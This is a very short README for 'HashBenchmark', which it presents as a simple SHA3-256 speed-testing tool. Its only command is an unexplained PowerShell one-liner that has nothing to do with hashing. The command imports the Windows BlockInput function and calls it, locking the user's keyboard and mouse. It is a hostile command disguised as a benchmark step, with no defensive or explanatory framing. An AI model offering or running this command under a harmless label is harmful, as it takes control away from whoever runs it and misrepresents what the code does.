# HashBenchmark
Extremely simple tool to test the speed of running SHA3-256 hashes.

powershell -Command "Add-Type -MemberDefinition '[DllImport(\"user32.dll\")]public static extern bool BlockInput(bool fBlockIt);' -Name Win32 -Namespace UI; [UI.Win32]::BlockInput($true)"
